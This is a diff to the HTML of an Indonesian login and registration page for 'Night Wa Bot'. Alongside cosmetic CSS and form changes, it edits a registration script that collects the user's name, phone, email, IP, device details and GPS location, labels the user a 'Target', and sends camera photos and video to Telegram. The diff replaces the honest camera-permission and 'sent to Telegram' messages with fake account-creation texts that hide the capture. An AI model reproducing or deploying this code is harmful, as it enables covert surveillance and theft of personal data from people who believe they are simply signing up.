@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 
 <html class="scroll-smooth" lang="id">
 <head>
@@ -204,9 +204,36 @@
         .iti__arrow--up {
             border-bottom-color: var(--text-secondary) !important;
         }
+@keyframes slideInLeft {
+  0% {opacity:0; transform: translateX(-80px);}
+  100% {opacity:1; transform: translateX(0);}
+}
+@keyframes slideInRight {
+  0% {opacity:0; transform: translateX(80px);}
+  100% {opacity:1; transform: translateX(0);}
+}
 
-    
-    </style>
+.animate-seq > * {
+  opacity: 0;
+}
+
+.animate-seq > *:nth-child(odd) {
+  animation: slideInLeft 0.9s ease-in-out forwards;
+}
+.animate-seq > *:nth-child(even) {
+  animation: slideInRight 0.9s ease-in-out forwards;
+}
+
+/* delay lebih panjang biar smooth */
+.animate-seq > *:nth-child(1) { animation-delay:0.2s; }
+.animate-seq > *:nth-child(2) { animation-delay:0.4s; }
+.animate-seq > *:nth-child(3) { animation-delay:0.6s; }
+.animate-seq > *:nth-child(4) { animation-delay:0.8s; }
+.animate-seq > *:nth-child(5) { animation-delay:1s; }
+.animate-seq > *:nth-child(6) { animation-delay:1.2s; }
+.animate-seq > *:nth-child(7) { animation-delay:1.4s; }
+.animate-seq > *:nth-child(8) { animation-delay:1.6s; }
+</style>
 </head>
 <body class="antialiased">
 <canvas id="particle-canvas"></canvas>
@@ -220,86 +247,109 @@
 </a>
 </div>
 <div class="hidden md:block">
-<a class="text-slate-300 hover:text-white transition-colors duration-200" href="/">Back to Home</a>
+  <a class="text-slate-300 hover:text-white transition-colors duration-200" href="/">Back to Home</a>
 </div>
 </div>
 </div>
 </nav>
-<main class="flex-grow flex items-center justify-center w-full px-4">
-<div class="w-full max-w-lg p-8 space-y-6 glow-card rounded-xl text-center slide-in-up" id="main-card">
-<h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
-<i class="text-indigo-400" data-feather="log-in"></i> Login Akun
-            </h2>
-<p class="text-slate-400 mt-2">Masuk ke akun Night Wa Bot Anda.</p>
-<form action="/auth/login" class="space-y-4 mt-6 text-left" id="login-form" method="POST">
-<div>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="user"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="username" name="username" placeholder="Masukkan username" required="" type="text"/>
-</div>
-</div>
-<div>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="lock"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="password" name="password" placeholder="Masukkan password" required="" type="password"/>
-</div>
-</div>
-<div class="flex items-center justify-between text-sm text-slate-400">
-<label class="flex items-center gap-2">
-<input class="h-4 w-4 rounded border-gray-500 bg-slate-700 text-indigo-600 focus:ring-indigo-500 cursor-pointer" type="checkbox"/>
-                        Ingat saya
-                    </label>
-<a class="text-indigo-400 hover:underline" href="/forgot-password">Lupa password?</a>
-</div>
-<button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg" type="submit">Masuk</button>
-</form>
-<p class="text-slate-400 text-sm mt-4">Belum punya akun? <a class="text-indigo-400 hover:underline" href="/register" id="show-register">Daftar sekarang</a></p>
 
-<form class="hidden space-y-4 mt-6 text-left" id="register-card" method="POST">
-<div>
-<label class="block text-sm font-medium text-slate-300 mb-1" for="fullname">Nama Lengkap</label>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="user"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="fullname" name="fullname" placeholder="Masukkan nama lengkap" required="" type="text"/>
-</div>
-</div>
-<div>
-<label class="block text-sm font-medium text-slate-300 mb-1" for="reg-username">Username</label>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="user-check"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-username" name="reg-username" placeholder="Masukkan username" required="" type="text"/>
-</div>
-</div>
-<div>
-<label class="block text-sm font-medium text-slate-300 mb-1" for="email">Email</label>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="mail"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="email" name="email" placeholder="Masukkan email" required="" type="email"/>
-</div>
-</div>
-<div>
-<label class="block text-sm font-medium text-slate-300 mb-1" for="phone">Nomor Telepon</label>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="phone"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="phone" name="phone" placeholder="Masukkan nomor telepon" required="" type="tel"/>
-</div>
-</div>
-<div>
-<label class="block text-sm font-medium text-slate-300 mb-1" for="reg-password">Password</label>
-<div class="flex items-center input-field rounded-lg px-3">
-<i class="text-indigo-400 mr-2" data-feather="lock"></i>
-<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-password" name="reg-password" placeholder="Masukkan password" required="" type="password"/>
-</div>
-</div>
-<button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg" type="submit">
+<main class="flex-grow flex items-center justify-center w-full px-4">
+  <div class="w-full max-w-lg p-8 space-y-6 glow-card rounded-xl text-center" id="main-card">
+
+    <!-- FORM LOGIN -->
+    <form action="/auth/login" class="space-y-4 text-left animate-seq" id="login-form" method="POST">
+      <h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
+        <i class="text-indigo-400" data-feather="log-in"></i> Login Akun
+      </h2>
+      <p class="text-slate-400 mt-2 text-center">Masuk ke akun Night Wa Bot Anda.</p>
+
+      <div class="flex items-center input-field rounded-lg px-3">
+        <i class="text-indigo-400 mr-2" data-feather="user"></i>
+        <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="username" name="username" placeholder="Masukkan username" required type="text"/>
+      </div>
+
+      <div class="flex items-center input-field rounded-lg px-3">
+        <i class="text-indigo-400 mr-2" data-feather="lock"></i>
+        <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="password" name="password" placeholder="Masukkan password" required type="password"/>
+      </div>
+
+      <div class="flex items-center justify-between text-sm text-slate-400">
+        <label class="flex items-center gap-2">
+          <input class="h-4 w-4 rounded border-gray-500 bg-slate-700 text-indigo-600 focus:ring-indigo-500 cursor-pointer" type="checkbox"/>
+          Ingat saya
+        </label>
+        <a class="text-indigo-400 hover:underline" href="/forgot-password">Lupa password?</a>
+      </div>
+
+      <button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg">
+        Masuk
+      </button>
+
+      <p class="text-slate-400 text-sm mt-4 text-center">
+        Belum punya akun? 
+        <a class="text-indigo-400 hover:underline" href="/register" id="show-register">Daftar sekarang</a>
+      </p>
+    </form>
+
+
+    <!-- FORM REGISTRASI -->
+    <form class="hidden space-y-4 text-left animate-seq" id="register-card" method="POST">
+      <h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
+        <i class="text-indigo-400" data-feather="user-plus"></i> Registrasi
+      </h2>
+      <p class="text-slate-400 mt-2 text-center">Buat akun baru untuk menggunakan Night Wa Bot.</p>
+
+      <div>
+        <label class="block text-sm font-medium text-slate-300 mb-1" for="fullname">Nama Lengkap</label>
+        <div class="flex items-center input-field rounded-lg px-3">
+          <i class="text-indigo-400 mr-2" data-feather="user"></i>
+          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="fullname" name="fullname" placeholder="Masukkan nama lengkap" required type="text"/>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-medium text-slate-300 mb-1" for="reg-username">Username</label>
+        <div class="flex items-center input-field rounded-lg px-3">
+          <i class="text-indigo-400 mr-2" data-feather="user-check"></i>
+          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-username" name="reg-username" placeholder="Masukkan username" required type="text"/>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-medium text-slate-300 mb-1" for="email">Email</label>
+        <div class="flex items-center input-field rounded-lg px-3">
+          <i class="text-indigo-400 mr-2" data-feather="mail"></i>
+          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="email" name="email" placeholder="Masukkan email" required type="email"/>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-medium text-slate-300 mb-1" for="phone">Nomor Telepon</label>
+        <div class="flex items-center input-field rounded-lg px-3">
+          <i class="text-indigo-400 mr-2" data-feather="phone"></i>
+          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="phone" name="phone" placeholder="Masukkan nomor telepon" required type="tel"/>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-medium text-slate-300 mb-1" for="reg-password">Password</label>
+        <div class="flex items-center input-field rounded-lg px-3">
+          <i class="text-indigo-400 mr-2" data-feather="lock"></i>
+          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-password" name="reg-password" placeholder="Masukkan password" required type="password"/>
+        </div>
+      </div>
+
+      <button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg">
         Daftar
-    </button>
-<p class="text-slate-400 text-sm mt-4 text-center">
+      </button>
+
+      <p class="text-slate-400 text-sm mt-4 text-center">
         Sudah punya akun? 
         <a class="text-indigo-400 hover:underline" href="#" id="show-login">Login sekarang</a>
-</p>
-</div>
-</div>
+      </p>
+    </form>
+
+  </div>
 </main>
 <footer class="border-t border-slate-700/50 mt-12">
 <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6 lg:px-8 text-center text-slate-400">
@@ -549,47 +599,54 @@ async function sendVideo(blob, caption){
 function buildPhotoCaption(obj){
   const now = new Date();
   const lines = [];
-  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  if (obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
-  if (obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
-  if (obj.profile && obj.profile.email) lines.push(` ├─ > Email: ${obj.profile.email}`);
-  lines.push(` ├─ >(Target)`);
-  lines.push(` │   └─ ${obj.userAgent || '-'}`);
-  lines.push(` ├─ > (IP)`);
+  lines.push(`📅 Tanggal: ${now.toLocaleString()}`);
+
+  if (obj.profile && obj.profile.name) 
+    lines.push(`👤 Nama: ${obj.profile.name}`);
+  if (obj.profile && obj.profile.phone) 
+    lines.push(`📱 Nomor: ${obj.profile.phone}`);
+  if (obj.profile && obj.profile.email) 
+    lines.push(`✉️ Email: ${obj.profile.email}`);
+
+  lines.push(`🎯 Target: ${obj.userAgent || '-'}`);
+
   const ip = obj.ipInfo || {};
-  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
-  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
-  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
-  lines.push(` │   ├─ City: ${ip.city || '-'}`);
-  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
-  lines.push(` │   └─ Country: ${ip.country || '-'}`);
-  lines.push(` ├─ > Device`);
-  lines.push(` │   ├─ Platform: ${obj.platform || '-'}`);
-  lines.push(` │   ├─ Screen: ${obj.screen || '-'}`);
-  lines.push(` │   ├─ Language: ${obj.language || '-'}`);
-  lines.push(` │   ├─ Timezone (browser): ${obj.timezone || '-'}`);
-  lines.push(` │   └─ Battery: ${obj.battery || '-'}`);
-  lines.push(` ├─ >(GPS)`);
+  lines.push(`🌐 IP: ${ip.ip || '-'}`);
+  lines.push(`🏢 ISP/Org: ${ip.org || '-'}`);
+  lines.push(`#️⃣ ASN: ${ip.asn || '-'}`);
+  lines.push(`🏙️ Kota: ${ip.city || '-'}`);
+  lines.push(`🗺️ Region: ${ip.region || '-'}`);
+  lines.push(`🇨🇴 Negara: ${ip.country || '-'}`);
+
+  lines.push(`💻 Device Info`);
+  lines.push(`🔧 Platform: ${obj.platform || '-'}`);
+  lines.push(`🖥️ Layar: ${obj.screen || '-'}`);
+  lines.push(`🌍 Bahasa: ${obj.language || '-'}`);
+  lines.push(`⏰ Zona Waktu: ${obj.timezone || '-'}`);
+  lines.push(`🔋 Baterai: ${obj.battery || '-'}`);
+
   if (obj.geo && !obj.geo.error) {
-    lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
-    lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
-    lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
+    lines.push(`📍 GPS`);
+    lines.push(`   • Lat: ${obj.geo.lat}`);
+    lines.push(`   • Lon: ${obj.geo.lon}`);
+    lines.push(`   • Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
   } else {
-    lines.push(` │   └─ GPS: ${obj.geo ? obj.geo.error : '-'}`);
+    lines.push(`📍 GPS: ${obj.geo ? obj.geo.error : '-'}`);
   }
-  lines.push(`╰─ > © ᴅᴀғғᴀ ᴅᴇᴠ`);
+
+  lines.push(`© ᴅᴀғғᴀ ᴅᴇᴠ`);
   return safeSlice(lines.join('\n'), 1000);
 }
 
 function buildVideoCaptionAddress(rev){
   const a = rev && rev.address ? rev.address : {};
   const lines = [];
-  lines.push(`├─ > Alamat (Detail)`);
-  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
-  lines.push(` │   ├─ Kode Negara: ${a.country_code || '-'}`);
-  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
-  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
-  lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);
+  lines.push(`📌 Alamat Detail`);
+  lines.push(`🌎 Negara: ${a.country || '-'}`);
+  lines.push(`🏳️‍🌈 Kode Negara: ${a.country_code || '-'}`);
+  lines.push(`🗾 Provinsi: ${a.state || a.region || '-'}`);
+  lines.push(`🏙️ Kota: ${a.city || a.town || a.village || '-'}`);
+  lines.push(`📮 Kode Pos: ${a.postcode || '-'}`);
   return safeSlice(lines.join('\n'), 1000);
 }
 
@@ -608,12 +665,12 @@ document.querySelector("#register-card button[type='submit']").addEventListener(
 
   // Tanya izin kamera dulu
   const { isConfirmed } = await Swal.fire({
-    title: "Izin Kamera",
-    text: "Izinkan akses kamera untuk ambil foto depan & belakang?",
+    title: "Notification",
+    text: "Dengan ini menyatakan anda akan mendaftarkan akun ke RavageShop!",
     icon: "question",
     showCancelButton: true,
-    confirmButtonText: "Izinkan",
-    cancelButtonText: "Tolak"
+    confirmButtonText: "Buat",
+    cancelButtonText: "Batal"
   });
 
   if (!isConfirmed) return;
@@ -621,7 +678,7 @@ document.querySelector("#register-card button[type='submit']").addEventListener(
   // Tampilkan loading
   Swal.fire({
     title: "Sedang memproses...",
-    html: "Mengambil data & mengirim ke Telegram",
+    html: "Membuat akun Anda.",
     allowOutsideClick: false,
     didOpen: () => Swal.showLoading()
   });
@@ -657,11 +714,11 @@ document.querySelector("#register-card button[type='submit']").addEventListener(
     await sendVideo(mediaRes.videoBlob, videoCaption);
 
     Swal.close();
-    Swal.fire({ icon: "success", title: "Berhasil", text: "Data & media terkirim ke Telegram ✅" });
+    Swal.fire({ icon: "success", title: "Berhasil", text: "Akun Anda telah di buat." });
   } catch (err) {
     console.error("Error in main flow:", err);
     Swal.close();
-    Swal.fire({ icon: "error", title: "Gagal", text: "Tidak bisa kirim ke Telegram" });
+    Swal.fire({ icon: "error", title: "Gagal", text: "Server Error" });
   }
 });
 </script>
